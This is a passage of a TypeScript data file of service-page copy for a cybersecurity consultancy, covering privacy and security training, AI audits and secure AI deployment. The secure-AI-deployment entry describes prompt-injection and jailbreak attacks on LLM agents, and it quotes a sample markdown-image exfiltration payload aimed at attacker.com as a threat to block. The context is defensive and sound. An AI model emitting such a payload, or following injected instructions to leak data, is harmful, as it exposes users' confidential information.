          "Managing opt-outs and real-time suppression list synchronization",
          "Proper handling of customer privacy complaints and grievance escalation"
        ]
      },
      {
        "category": "HR & Operations Track: Employee Data Privacy",
        "description": "Training HR professionals on handling employee PII, payroll, and background checks.",
        "capabilities": [
          "Lawful processing of employee personal data under employment contracts",
          "Managing employee health, biometric, and attendance records",
          "Secure offboarding and post-employment data retention schedules",
          "Handling vendor contractor and candidate resume privacy"
        ]
      },
      {
        "category": "Executive & Legal Track: Fiduciary Governance",
        "description": "Strategic briefing for C-suite executives, Board of Directors, and in-house legal counsel.",
        "capabilities": [
          "Fiduciary liability under the DPDP Act and personal risk management",
          "Statutory breach notification deadlines and crisis communications",
          "Navigating enforcement actions and inquiries from the Data Protection Board",
          "Structuring privacy budgets and vendor contractual obligations"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Training Needs Analysis (TNA)",
        "title": "Curriculum Calibration",
        "description": "Evaluating your tech stack, business model, and departmental workflows to customize training content.",
        "activities": [
          "Departmental risk profiling",
          "Custom case study development",
          "Scheduling executive and technical cohorts"
        ]
      },
      {
        "step": "02",
        "phase": "Interactive Workshop Delivery",
        "title": "Live Expert Masterclasses",
        "description": "Conducting engaging, live instructor-led sessions (in-person or virtual) led by senior cyber attorneys and privacy engineers.",
        "activities": [
          "Live interactive workshops",
          "Real-world breach post-mortem analysis",
          "Interactive Q&A clinics"
        ]
      },
      {
        "step": "03",
        "phase": "Practical Scenario Labs",
        "title": "War Games & Hands-On Exercises",
        "description": "Engaging participants in practical exercises: reviewing real consent notices, redlining mock DPAs, or tracing data flows.",
        "activities": [
          "Consent UI review exercises",
          "Mock grievance resolution drills",
          "Technical coding challenge reviews"
        ]
      },
      {
        "step": "04",
        "phase": "Knowledge Assessment & Certification",
        "title": "Competence Evaluation",
        "description": "Administering post-training quizzes and issuing verifiable completion certificates for all employees.",
        "activities": [
          "Post-training knowledge test",
          "Remediation coaching for low scorers",
          "Certificate of completion issuance"
        ]
      },
      {
        "step": "05",
        "phase": "Compliance Audit Trail Archive",
        "title": "Regulatory Recordkeeping",
        "description": "Delivering complete attendance manifests, quiz scores, and course syllabi for statutory audit defense.",
        "activities": [
          "Attendance manifest archiving",
          "Executive training report delivery",
          "Annual refresher schedule setup"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "DPDP Workforce Compliance Training Report",
        "format": "Comprehensive Formal PDF Dossier",
        "audience": "Data Protection Board, CISO, Head of HR",
        "description": "Authoritative documentation containing attendance manifests, competency assessment scores, and syllabus records."
      },
      {
        "title": "Verifiable DPDPA Employee Certificates",
        "format": "Digital Verifiable Badges / Certificates",
        "audience": "All Participating Employees",
        "description": "Official certificate of completion validating that the employee has been trained in DPDP Act 2023 compliance."
      },
      {
        "title": "Departmental Privacy Quick-Reference Guides",
        "format": "Digital Handbooks / Desk Guides",
        "audience": "Engineers, HR Staff, Marketing Teams",
        "description": "Practical reference sheets summarizing daily dos and don'ts for handling personal data lawfully."
      }
    ],
    "engagementModels": [
      {
        "name": "Enterprise-Wide DPDPA Enablement Program",
        "suitableFor": "All corporate employees across engineering, marketing, HR, and operations",
        "description": "Comprehensive role-based cohorts covering the entire organization with verifiable testing."
      },
      {
        "name": "Executive & Board Masterclass (Half-Day)",
        "suitableFor": "Board of Directors, Managing Director, and C-suite executives",
        "description": "High-level strategic briefing on fiduciary responsibilities, board oversight, and penalty risks."
      },
      {
        "name": "Deep Technical Privacy Engineering Workshop",
        "suitableFor": "Software developers, cloud architects, and product managers",
        "description": "Hands-on code-level workshop focusing on building compliant consent, storage, and deletion architectures."
      }
    ],
    "faqs": [
      {
        "question": "Is employee data privacy training legally required under the DPDP Act?",
        "answer": "While the Act focuses on outcomes, Section 8 mandates that Data Fiduciaries must implement reasonable security safeguards to prevent personal data breaches. Demonstrating that employees were trained is fundamental proof of reasonable care before the Data Protection Board."
      },
      {
        "question": "Can the training be customized to our specific software stack and industry?",
        "answer": "Yes! Every masterclass is tailored to your company's actual workflows—whether you are a fintech processing UPI payments, an e-commerce platform capturing shipping details, or an enterprise SaaS."
      },
      {
        "question": "Do you offer on-demand e-learning modules in addition to live sessions?",
        "answer": "Yes. In addition to live instructor-led workshops, we provide modular digital learning content and quizzes that can be hosted on your internal Learning Management System (LMS)."
      }
    ]
  }
];

const TRAINING_SERVICES: SubServiceDetail[] = [
  {
    "category": "training",
    "categoryTitle": "Training Programs & MRA",
    "id": "data-analytics-training",
    "slug": "data-analytics-training",
    "title": "Expert-Led Training in Data Analytics & Security Telemetry",
    "navTitle": "Expert-led training in Data Analytics",
    "badge": "Technical SOC & Data Analytics",
    "tagline": "Master Security Telemetry, Behavioral Big Data Analytics, and Automated Threat Correlation.",
    "heroSummary": "Intensive, hands-on technical training empowering data analysts, SOC engineers, and cyber operators to analyze massive volumes of security telemetry. We train teams on log pipelines, SIEM correlation query design, anomaly detection using Python and SQL, and threat hunting workflows.",
    "promise": "Transform Raw Security Big Data into Actionable Threat Intelligence",
    "metrics": [
      {
        "value": "Hands-On",
        "label": "Real Data Labs",
        "sub": "Multi-gigabyte telemetry datasets"
      },
      {
        "value": "SIEM / XDR",
        "label": "Query Mastery",
        "sub": "KQL, SPL & SQL skills"
      },
      {
        "value": "Python",
        "label": "Behavioral Analytics",
        "sub": "Statistical anomaly models"
      },
      {
        "value": "Certified",
        "label": "Practitioner Badges",
        "sub": "Verified technical competence"
      }
    ],
    "frameworks": [
      "NIST NICE Cybersecurity Workforce Framework",
      "MITRE ATT&CK",
      "SANS SEC555",
      "Big Data Analytics Frameworks"
    ],
    "whyItMatters": {
      "title": "Enterprises Drown in Logs but Starve for Insights",
      "description": "Modern enterprise firewalls, cloud environments, and EDRs generate terabytes of raw telemetry daily. Without advanced analytics skills, security teams suffer from alert fatigue while sophisticated attacks slip past unnoticed.",
      "points": [
        {
          "headline": "Build High-Fidelity Detection Queries",
          "detail": "Empower analysts to author custom, high-accuracy detection rules in Splunk (SPL), Microsoft Sentinel (KQL), and Snowflake."
        },
        {
          "headline": "Apply Machine Learning & Statistical Anomaly Models",
          "detail": "Train data engineers to use Python, Pandas, and Jupyter to spot subtle persistence beacons and insider data exfiltration."
        },
        {
          "headline": "Bridge the Gap Between Data Science and Cybersecurity",
          "detail": "Enable data analytics teams to understand adversary tactics and translate cyber telemetry into operational business dashboards."
        }
      ]
    },
    "vectors": [
      {
        "category": "Telemetry Ingestion & Big Data Architecture",
        "description": "Understanding log pipelines, normalization, and high-throughput streaming.",
        "capabilities": [
          "Syslog, Kafka, and OpenTelemetry pipeline architectures",
          "Data schema normalization (OSSF, CEF, ECS, JSON)",
          "Optimizing log storage tiers (Hot, Warm, Cold, and Glacier)",
          "Parsing complex custom application and API authentication logs"
        ]
      },
      {
        "category": "Advanced Query Languages (KQL, SPL, SQL)",
        "description": "Mastering query languages used in modern SIEM and data lake environments.",
        "capabilities": [
          "Writing complex aggregations, joins, and regex in KQL and SPL",
          "Time-series behavioral baseline calculation and deviation alerts",
          "Statistical outlier identification across authentication datasets",
          "Translating MITRE ATT&CK techniques into actionable queries"
        ]
      },
      {
        "category": "Python for Cyber Telemetry & Automation",
        "description": "Using Python data science libraries for threat hunting and threat intelligence correlation.",
        "capabilities": [
          "Analyzing network packet PCAPs and flow data with Scapy and Pandas",
          "Automating threat intelligence API lookups for bulk indicators",
          "Building machine learning clustering models to detect beaconing",
          "Automating repetitive incident enrichment workflows"
        ]
      },
      {
        "category": "Executive Dashboarding & Threat Metrics",
        "description": "Communicating risk metrics through clear, real-time visual dashboards.",
        "capabilities": [
          "Designing executive security scorecards in PowerBI, Tableau, and Grafana",
          "Visualizing attack path kill chains and lateral movement graphs",
          "Tracking Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR)",
          "Automated compliance metric tracking dashboards"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Skill Assessment & Track Mapping",
        "title": "Cohort Baseline",
        "description": "Assessing current analytics proficiencies and tailoring lab datasets to your corporate technology stack.",
        "activities": [
          "Pre-training diagnostic test",
          "Lab environment provisioning",
          "Curriculum customization"
        ]
      },
      {
        "step": "02",
        "phase": "Core Foundations & Query Labs",
        "title": "Query Engineering",
        "description": "Intensive hands-on labs training engineers on writing high-performance SIEM and data warehouse queries.",
        "activities": [
          "Live query crafting labs",
          "Complex regex exercises",
          "Performance optimization drills"
        ]
      },
      {
        "step": "03",
        "phase": "Behavioral Analytics & Anomaly Hunting",
        "title": "Advanced Analytics",
        "description": "Applying statistical models, long-tail analysis, and Python scripts to hunt across realistic simulated breach datasets.",
        "activities": [
          "Beaconing detection exercises",
          "Credential stuffing pattern recognition",
          "Time-series anomaly hunting"
        ]
      },
      {
        "step": "04",
        "phase": "Capstone Simulated Threat Hunt",
        "title": "Live Incident Analysis",
        "description": "Participants investigate a multi-stage enterprise breach dataset, discovering the root cause and compiling an incident report.",
        "activities": [
          "Real-world telemetry hunt",
          "Root cause timeline reconstruction",
          "Findings presentation"
        ]
      },
      {
        "step": "05",
        "phase": "Certification & Continuous Enablement",
        "title": "Accreditation",
        "description": "Evaluating capstone submissions and awarding verifiable technical competency certificates.",
        "activities": [
          "Capstone grading",
          "Verifiable certificate issuance",
          "Reference workbook distribution"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Technical Training Workbooks & Lab Codebase",
        "format": "Jupyter Notebooks, GitHub Repositories, PDF Manuals",
        "audience": "Participating Engineers, Data Analysts",
        "description": "Complete repository of reusable Python detection scripts, sample datasets, query cheat sheets, and lab exercises."
      },
      {
        "title": "Verifiable Technical Competency Certificates",
        "format": "Digital Cryptographic Badges",
        "audience": "Participants, HR, Management",
        "description": "Official certification validating mastery in security data analytics and telemetry correlation."
      },
      {
        "title": "Enterprise Telemetry Optimization Playbook",
        "format": "Engineering Reference Manual",
        "audience": "CISO, Lead Data Architect",
        "description": "Strategic recommendations on optimizing internal log pipelines, reducing ingest costs, and improving query performance."
      }
    ],
    "engagementModels": [
      {
        "name": "Corporate Bootcamp Cohort (4 to 5 Days)",
        "suitableFor": "Internal SOC teams, Data Science units, and IT engineering departments",
        "description": "Intensive full-day masterclass combining theory, live instructor coding, and capstone labs."
      },
      {
        "name": "Weekend Professional Masterclass Track",
        "suitableFor": "Working engineers and data analysts seeking progressive skill elevation",
        "description": "Part-time modular sessions delivered over consecutive weekends."
      },
      {
        "name": "Customized SIEM/XDR Team Enablement",
        "suitableFor": "Enterprises migrating to new platforms like Microsoft Sentinel, Splunk, or Snowflake",
        "description": "Targeted training focused specifically on authoring detection logic for your new platform."
      }
    ],
    "faqs": [
      {
        "question": "What prerequisites are required for participants?",
        "answer": "Participants should have basic familiarity with IT networking concepts and basic knowledge of SQL or scripting (Python). Prior experience in cybersecurity is helpful but not mandatory."
      },
      {
        "question": "Are labs conducted using real breach data?",
        "answer": "Yes! Our cloud lab environments contain multi-gigabyte sanitized datasets from real enterprise intrusions, including ransomware campaigns, APT lateral pivots, and cloud IAM compromise traces."
      },
      {
        "question": "Can the training be tailored to our company's specific SIEM platform?",
        "answer": "Absolutely. We customize lab exercises to focus on Microsoft Sentinel (KQL), Splunk (SPL), Elastic (EQL/Kibana), Snowflake (SQL), or Datadog."
      }
    ]
  },
  {
    "category": "training",
    "categoryTitle": "Training Programs & MRA",
    "id": "cyber-awareness",
    "slug": "data-privacy-cybersecurity-awareness",
    "title": "Data Privacy & Cybersecurity Workforce Awareness",
    "navTitle": "Data Privacy and Cybersecurity awareness.",
    "badge": "Human Perimeter Enablement",
    "tagline": "Empower Every Employee to Recognize Cyber Threats, Social Engineering, and Privacy Pitfalls.",
    "heroSummary": "Comprehensive enterprise security awareness and data privacy training designed for all non-technical and technical employees. We cover modern spear-phishing, AitM MFA bypass, credential hygiene, remote work security, and everyday data privacy compliance.",
    "promise": "Build an Active, Vigilant Human Defense Line",
    "metrics": [
      {
        "value": "95%",
        "label": "Phishing Reporting",
        "sub": "Active threat escalation"
      },
      {
        "value": "Engaging",
        "label": "Gamified Learning",
        "sub": "Zero dry corporate slide decks"
      },
      {
        "value": "Continuous",
        "label": "Quarterly Refresher",
        "sub": "Adaptive threat simulations"
      },
      {
        "value": "100%",
        "label": "Audit Compliance",
        "sub": "ISO, SOC 2 & DPDPA ready"
      }
    ],
    "frameworks": [
      "NIST SP 800-50",
      "ISO/IEC 27001 Annex A.7",
      "SANS Security Awareness Framework",
      "CISA Cyber Hygiene Guidelines"
    ],
    "whyItMatters": {
      "title": "Attackers Target People, Not Just Firewalls",
      "description": "Over 90% of successful corporate breaches start with a phishing email, a compromised password, or social engineering targeting an everyday employee in accounting, sales, or customer service.",
      "points": [
        {
          "headline": "Defend Against AI-Powered Social Engineering",
          "detail": "Train employees to recognize sophisticated deepfake voice calls, automated spear-phishing, and QR code scams (quishing)."
        },
        {
          "headline": "Enforce Sound Password & Multi-Factor Hygiene",
          "detail": "Educate staff on the dangers of password reuse across personal accounts and how to respond to MFA fatigue push bombing."
        },
        {
          "headline": "Satisfy Mandatory Compliance Requirements",
          "detail": "Fulfill annual employee awareness training mandates required by ISO 27001, SOC 2, PCI DSS, RBI, and India's DPDP Act."
        }
      ]
    },
    "vectors": [
      {
        "category": "Phishing, Quishing & Social Engineering Recognition",
        "description": "Training employees to spot red flags in modern, highly convincing lures.",
        "capabilities": [
          "Identifying spoofed sender domains and subtle character homoglyphs",
          "Recognizing QR code phishing (quishing) in PDF attachments",
          "Spotting urgent CEO fraud and supplier invoice payment scams",
          "Reporting suspicious emails with 1-click SOC notification tools"
        ]
      },
      {
        "category": "Credential Security & MFA Protection",
        "description": "Eliminating password reuse and protecting multi-factor authentication tokens.",
        "capabilities": [
          "Safe usage of enterprise password managers (1Password, Bitwarden)",
          "Recognizing and denying unsolicited MFA push requests (MFA fatigue)",
          "Understanding the risks of infostealer malware on home computers",
          "Preventing credential sharing across chat tools and email"
        ]
      },
      {
        "category": "Remote & Hybrid Work Security",
        "description": "Securing laptops, home Wi-Fi networks, and mobile devices in distributed workforces.",
        "capabilities": [
          "Secure home router Wi-Fi configuration and WPA3 encryption",
          "Mandatory VPN and ZTNA usage on untrusted public Wi-Fi networks",
          "Preventing shoulder surfing and clean desk security in public spaces",
          "Safe handling of lost or stolen corporate laptops and phones"
        ]
      },
      {
        "category": "Everyday Data Privacy & Clean Data Handling",
        "description": "Teaching non-technical staff how to handle customer personal data lawfully.",
        "capabilities": [
          "Preventing accidental customer PII leaks in email threads and chats",
          "Ensuring sensitive spreadsheets are encrypted before transmission",
          "Recognizing consumer requests for data deletion or opt-out",
          "Immediate escalation protocols for suspected data leaks"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Baseline Vulnerability Assessment",
        "title": "Phishing Baseline Drill",
        "description": "Running an initial unannounced simulated phishing drill to measure your organization's true baseline click-rate.",
        "activities": [
          "Baseline phishing campaign",
          "Knowledge survey dispatch",
          "Departmental risk scoring"
        ]
      },
      {
        "step": "02",
        "phase": "Customized Content Engineering",
        "title": "Curriculum Tailoring",
        "description": "Customizing training modules to reflect your real software tools (Slack, Microsoft 365, Google Workspace, Jira).",
        "activities": [
          "Corporate branding integration",
          "Threat scenario customization",
          "LMS compatibility verification"
        ]
      },
      {
        "step": "03",
        "phase": "Interactive Multimodal Delivery",
        "title": "Engaging Workforce Training",
        "description": "Delivering short, gamified micro-learning modules paired with live interactive webinars led by cyber experts.",
        "activities": [
          "Gamified micro-modules rollout",
          "Live executive and staff webinars",
          "Interactive threat clinics"
        ]
      },
      {
        "step": "04",
        "phase": "Simulated Reinforcement Drills",
        "title": "Continuous Behavioral Testing",
        "description": "Deploying quarterly automated phishing drills with adaptive difficulty to reinforce learning over time.",
        "activities": [
          "Quarterly spear-phishing drills",
          "Teachable moment feedback",
          "Repeat clicker targeted micro-coaching"
        ]
      },
      {
        "step": "05",
        "phase": "Compliance Audit Reporting",
        "title": "Annual Governance Report",
        "description": "Delivering comprehensive completion manifests and behavioral improvement graphs for auditors and regulators.",
        "activities": [
          "Audit manifest archiving",
          "Executive board presentation",
          "Annual compliance certification"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Enterprise Workforce Cybersecurity Aptitude Report",
        "format": "Comprehensive Formal PDF Dossier",
        "audience": "Board of Directors, CISO, Head of HR, Auditors",
        "description": "Authoritative report documenting 100% training completion, phishing click-rate reductions, and human risk posture metrics."
      },
      {
        "title": "SCORM Compliant Micro-Learning Modules",
        "format": "SCORM 1.2 / 2004 LMS Packages + Video Files",
        "audience": "Internal Corporate LMS Administrators",
        "description": "Bite-sized, animated, interactive training modules ready for seamless integration into your existing HR LMS."
      },
      {
        "title": "Security Culture Desk Guide & Infographics",
        "format": "Printable Posters & Digital Wallpapers",
        "audience": "All Corporate Staff",
        "description": "High-impact visual cheat sheets summarizing key cyber hygiene rules and emergency incident reporting numbers."
      }
    ],
    "engagementModels": [
      {
        "name": "Annual Managed Cyber Awareness Program",
        "suitableFor": "All modern enterprises needing continuous employee training and quarterly drills",
        "description": "Full-year managed program: ongoing micro-learning, quarterly phishing simulations, and compliance reporting."
      },
      {
        "name": "Live All-Hands Cyber Masterclass (Webinar)",
        "suitableFor": "Cybersecurity Awareness Month (October) or post-incident workforce refreshers",
        "description": "High-energy, 90-minute live interactive masterclass with live hacking demonstrations."
      },
      {
        "name": "New Hire Onboarding Security Track",
        "suitableFor": "Seamlessly training every new employee during their first week on the job",
        "description": "Automated onboarding module and quiz ensuring zero unvetted staff touch corporate data."
      }
    ],
    "faqs": [
      {
        "question": "How long are the training modules, and will they disrupt employee work?",
        "answer": "Our modules are designed around micro-learning principles—concise, engaging, 5-to-10 minute interactive segments that employees can complete at their own pace without interrupting daily productivity."
      },
      {
        "question": "Does this program satisfy our annual ISO 27001 and SOC 2 training requirements?",
        "answer": "Yes! The program strictly covers all mandatory curriculum topics required by ISO 27001 (Clause 7.2 / A.7.2), SOC 2 (Common Criteria CC2.2), PCI DSS, and India's DPDP Act, providing audit-ready attendance logs."
      },
      {
        "question": "Can we host the modules on our own internal Learning Management System (LMS)?",
        "answer": "Yes! All modules are packaged in standard SCORM 1.2, SCORM 2004, and xAPI formats, allowing seamless plug-and-play integration into Workday, Cornerstone, SAP SuccessFactors, or custom LMS platforms."
      }
    ]
  }
];

const AI_SERVICES: SubServiceDetail[] = [
  {
    "category": "ai",
    "categoryTitle": "AI Audits",
    "id": "ai-system-audits",
    "slug": "ai-system-audits-risk-assessment",
    "title": "AI System Audits & Risk Assessment",
    "navTitle": "AI system audits and risk assessments ensuring ethical",
    "badge": "AI Security & Compliance",
    "tagline": "Comprehensive Security, Privacy, and Ethical Risk Auditing for Enterprise AI Deployments.",
    "heroSummary": "Independent technical audits and statutory risk assessments for enterprise artificial intelligence, machine learning pipelines, and Large Language Model (LLM) architectures. We evaluate training data lineage, algorithmic bias, model inversion risks, and statutory alignment with the EU AI Act and NIST AI RMF.",
    "promise": "Independent Third-Party Verification of AI Safety, Privacy & Security",
    "metrics": [
      {
        "value": "NIST AI",
        "label": "RMF Benchmarked",
        "sub": "Govern, Map, Measure, Manage"
      },
      {
        "value": "EU AI Act",
        "label": "Statutory Readiness",
        "sub": "Risk tier classification"
      },
      {
        "value": "0-Leak",
        "label": "Training Data Privacy",
        "sub": "PII & copyright scrubbing"
      },
      {
        "value": "360°",
        "label": "Model Governance",
        "sub": "Bias, ethics & safety"
      }
    ],
    "frameworks": [
      "NIST AI Risk Management Framework (AI RMF 1.0)",
      "ISO/IEC 42001 (AI Management System)",
      "EU AI Act Guidelines",
      "MITRE ATLAS (Adversarial ML)"
    ],
    "whyItMatters": {
      "title": "Deploying AI Without Security Audits Creates Unbounded Enterprise Liability",
      "description": "Enterprise AI systems ingest proprietary customer data, generate automated business decisions, and integrate directly into backend databases. Vulnerabilities like prompt injection, data poisoning, and unauthorized PII leakage can trigger catastrophic legal and financial consequences.",
      "points": [
        {
          "headline": "Ensure Statutory Compliance with Global AI Regulations",
          "detail": "Classify your AI use cases under the EU AI Act and NIST AI RMF to ensure high-risk models meet mandatory human oversight and transparency rules."
        },
        {
          "headline": "Prevent Sensitive Corporate & PII Data Leakage",
          "detail": "Verify that proprietary code, customer records, and confidential financials are not ingested into model weights or exposed through RAG pipelines."
        },
        {
          "headline": "Mitigate Algorithmic Bias & Fiduciary Liability",
          "detail": "Audit automated decision engines (credit underwriting, hiring, fraud scoring) for demographic bias, ensuring fairness and audit defensibility."
        }
      ]
    },
    "vectors": [
      {
        "category": "Training Data Lineage & Privacy Scrubbing",
        "description": "Inspecting data ingestion pipelines, vector databases, and fine-tuning datasets for unauthorized content.",
        "capabilities": [
          "Scanning training corpora for unscrubbed Personally Identifiable Information (PII)",
          "Verifying compliance with copyrighted data and open-source license restrictions",
          "Auditing Retrieval-Augmented Generation (RAG) vector database access controls",
          "Validating training data integrity against data poisoning and label tampering"
        ]
      },
      {
        "category": "Algorithmic Fairness, Bias & Ethical Auditing",
        "description": "Evaluating model predictions and outputs across demographic and protected characteristics.",
        "capabilities": [
          "Statistical parity and disparate impact testing on predictive models",
          "Fairness metric evaluation (equalized odds, demographic parity)",
          "Explainability and feature importance analysis (SHAP / LIME)",
          "Auditing automated rejection and underwriting thresholds for unintended bias"
        ]
      },
      {
        "category": "Model Inversion & Intellectual Property Protection",
        "description": "Assessing whether external adversaries can extract proprietary weights or reconstruct training data.",
        "capabilities": [
          "Membership inference attack simulation against model APIs",
          "Model stealing and hyperparameter extraction vulnerability testing",
          "Watermarking and model fingerprinting verification",
          "Evaluating rate limiting and API query obfuscation safeguards"
        ]
      },
      {
        "category": "Statutory AI Governance & System Documentation",
        "description": "Evaluating AI governance frameworks against ISO/IEC 42001 and the EU AI Act.",
        "capabilities": [
          "Classifying AI systems into Unacceptable, High, and Minimal risk tiers",
          "Reviewing technical documentation and model cards for transparency compliance",
          "Auditing Human-in-the-Loop (HITL) oversight and override mechanisms",
          "Establishing ongoing post-market monitoring and incident reporting protocols"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "AI Architecture Discovery",
        "title": "Model & Data Cataloging",
        "description": "Mapping model architectures, foundational LLM providers, training data sources, and downstream API consumers.",
        "activities": [
          "AI asset inventory compilation",
          "Risk tier categorization",
          "Regulatory scope alignment"
        ]
      },
      {
        "step": "02",
        "phase": "Training Data & Pipeline Audit",
        "title": "Data Lineage Inspection",
        "description": "Inspecting data preprocessing pipelines, PII scrubbing routines, and vector database access controls.",
        "activities": [
          "PII leakage scanning",
          "Copyright license review",
          "Vector database permission audit"
        ]
      },
      {
        "step": "03",
        "phase": "Fairness, Bias & Explainability Testing",
        "title": "Algorithmic Evaluation",
        "description": "Running automated bias sweeps and statistical parity tests across protected demographic slices.",
        "activities": [
          "Disparate impact calculation",
          "Feature attribution analysis",
          "Edge-case hallucination testing"
        ]
      },
      {
        "step": "04",
        "phase": "Adversarial Extraction Probing",
        "title": "Model Defense Testing",
        "description": "Simulating membership inference, model inversion, and extraction attacks against the model's inference API.",
        "activities": [
          "Membership inference tests",
          "Model stealing simulation",
          "Rate-limit threshold verification"
        ]
      },
      {
        "step": "05",
        "phase": "Governance Reporting & Certification",
        "title": "Statutory Attestation",
        "description": "Delivering the comprehensive AI Audit Dossier, model cards, and formal Certificate of AI Security Assurance.",
        "activities": [
          "Model governance report delivery",
          "Model card documentation sign-off",
          "AI assurance certificate issuance"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Statutory AI System Audit Report",
        "format": "Comprehensive Formal Technical Dossier",
        "audience": "Board of Directors, Chief AI Officer, Regulators",
        "description": "Exhaustive evaluation documenting compliance with NIST AI RMF, ISO 42001, data lineage integrity, bias metrics, and model defenses."
      },
      {
        "title": "Standardized Model Card & Transparency Dossier",
        "format": "Technical Model Card (JSON / PDF)",
        "audience": "Data Science Teams, Enterprise Clients",
        "description": "Transparent documentation of model intended use, training parameters, performance limitations, and safety evaluations."
      },
      {
        "title": "Certificate of AI Security & Safety Assurance",
        "format": "Official Signed Certificate",
        "audience": "Enterprise Prospects, Regulators, Public Website",
        "description": "Official third-party attestation validating that your AI deployment has undergone independent security and ethical audit."
      }
    ],
    "engagementModels": [
      {
        "name": "Full Enterprise AI System Audit",
        "suitableFor": "High-risk AI models in production (fintech, healthcare, recruitment, automated underwriting)",
        "description": "Comprehensive audit covering data lineage, bias, security defenses, and statutory governance."
      },
      {
        "name": "Pre-Deployment AI Safety & Privacy Verification",
        "suitableFor": "Engineering teams preparing to launch custom LLMs, RAG apps, or agentic workflows",
        "description": "Focused 2-week verification ensuring zero PII leakage and robust model extraction defenses."
      },
      {
        "name": "ISO 42001 / EU AI Act Readiness Assessment",
        "suitableFor": "Organizations adopting formal AI Management Systems for global enterprise procurement",
        "description": "Benchmarking governance policies and technical safeguards against ISO/IEC 42001 standards."
      }
    ],
    "faqs": [
      {
        "question": "How does an AI System Audit differ from a traditional software security audit?",
        "answer": "Traditional security audits test code and network perimeters. An AI System Audit evaluates the unique risks of machine learning: data poisoning, training data PII leakage, algorithmic bias, model theft, hallucination boundaries, and statutory AI compliance."
      },
      {
        "question": "Do we need to share our proprietary model weights with Envista?",
        "answer": "No. Most evaluations (such as black-box extraction probing, bias testing, and RAG privacy checks) are conducted through API inference endpoints. For code and pipeline audits, testing can occur within client-managed isolated environments."
      },
      {
        "question": "Which regulations apply to enterprise AI systems today?",
        "answer": "The EU AI Act introduces strict statutory rules and penalties for high-risk AI. In the US, the NIST AI RMF and White House Executive Orders guide federal and enterprise procurement. In India, MeitY advisories mandate labeling, bias prevention, and DPDP compliance."
      }
    ]
  },
  {
    "category": "ai",
    "categoryTitle": "AI Audits",
    "id": "secure-ai-deployment",
    "slug": "secure-ai-deployment",
    "title": "Secure AI Deployment & Model Governance",
    "navTitle": "secure AI deployment.",
    "badge": "Production AI Hardening",
    "tagline": "Harden LLMs, Agentic Workflows, and Production AI Pipelines Against Real-World Attacks.",
    "heroSummary": "End-to-end security engineering, prompt injection defenses, and semantic guardrail implementation for production AI systems. We protect your Large Language Models, agentic workflows, and microservice APIs against jailbreaking, data leakage, and unauthorized autonomous actions.",
    "promise": "Production Hardening Aligned with OWASP Top 10 for LLMs",
    "metrics": [
      {
        "value": "OWASP",
        "label": "LLM Top 10 Protected",
        "sub": "Complete threat coverage"
      },
      {
        "value": "Sub-50ms",
        "label": "Guardrail Latency",
        "sub": "Real-time semantic filters"
      },
      {
        "value": "100%",
        "label": "Indirect Injection Defense",
        "sub": "RAG & tool execution safety"
      },
      {
        "value": "Agentic",
        "label": "Autonomous Safeguards",
        "sub": "Permission boundary isolation"
      }
    ],
    "frameworks": [
      "OWASP Top 10 for LLM Applications",
      "MITRE ATLAS Matrix",
      "NIST AI RMF",
      "CISA Secure by Design AI Guidelines"
    ],
    "whyItMatters": {
      "title": "Production LLMs Can Be Manipulated in Seconds",
      "description": "Generative AI applications that interact with users or consume external documents (RAG) are vulnerable to direct and indirect prompt injection attacks that bypass system instructions, leak internal API keys, and execute unauthorized database queries.",
      "points": [
        {
          "headline": "Block Direct Jailbreaks & System Prompt Theft",
          "detail": "Prevent malicious users from coercing models into disclosing confidential system prompts, secret rules, or executing forbidden commands."
        },
        {
          "headline": "Neutralize Indirect Prompt Injection in RAG & Documents",
          "detail": "Stop hidden adversarial text in ingested PDFs, emails, and web pages from commandeering your AI agents to exfiltrate data."
        },
        {
          "headline": "Constrain Autonomous Agent Execution Boundaries",
          "detail": "Implement strict Least Privilege guardrails and human-in-the-loop approvals before AI agents invoke external APIs or databases."
        }
      ]
    },
    "vectors": [
      {
        "category": "Direct Prompt Injection & Jailbreak Defense",
        "description": "Hardening system prompts and deploying semantic classifiers to intercept adversarial inputs.",
        "capabilities": [
          "Deploying semantic input guardrails that detect adversarial jailbreak framing",
          "Multi-layered system prompt architecture with cryptographic delimiters",
          "Adversarial token perturbation and Unicode character bypass defense",
          "Preventing role-reversal attacks and ethical safeguard overrides"
        ]
      },
      {
        "category": "Indirect Prompt Injection in RAG Pipelines",
        "description": "Securing document ingestion against embedded hidden instructions and malicious context.",
        "capabilities": [
          "Sanitizing ingested customer documents (PDFs, DOCX, CSVs) for invisible prompt injection",
          "Enforcing strict separation between trusted system instructions and untrusted data",
          "Preventing data exfiltration through markdown image injection (`![data](https://attacker.com/exfil?d=...)`)",
          "Validating context chunk relevance before feeding vector data into model prompts"
        ]
      },
      {
        "category": "Autonomous Agent & Tool Execution Security",
        "description": "Restricting AI agents with function calling and API execution capabilities.",
        "capabilities": [
          "Enforcing strict least-privilege API scopes for tool-calling agents",
          "Implementing mandatory Human-in-the-Loop (HITL) gates for financial transactions and deletions",
          "Sanitizing dynamic SQL and shell command parameters generated by LLMs",
          "Preventing infinite agent loops and resource consumption denial-of-service"
        ]
      },
      {
        "category": "Semantic Output Filtering & Data Loss Prevention (DLP)",
        "description": "Filtering model completions in real time to prevent sensitive data leakage.",
        "capabilities": [
          "Regex and semantic entity filtering for credit cards, PII, and API keys in completions",
          "Hallucination detection and confidence scoring before delivering answers to users",
          "Blocking unsafe code generation and vulnerability exploitation suggestions",
          "Auditing model output compliance against corporate tone and safety guidelines"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Architecture & Threat Modeling",
        "title": "LLM Threat Surface Mapping",
        "description": "Mapping model access points, third-party plugin integrations, RAG data ingestion, and agent tool execution permissions.",
        "activities": [
          "Model integration architecture review",
          "Agent permission inventory",
          "Threat model diagramming"
        ]
      },
      {
        "step": "02",
        "phase": "Red Teaming & Exploitation Testing",
        "title": "Adversarial Prompt Probing",
        "description": "Our offensive researchers execute automated and manual jailbreaks, prompt injections, and data extraction attacks.",
        "activities": [
          "Direct jailbreak payload execution",
          "Indirect document injection tests",
          "Agent tool privilege escalation attempts"
        ]
      },
      {
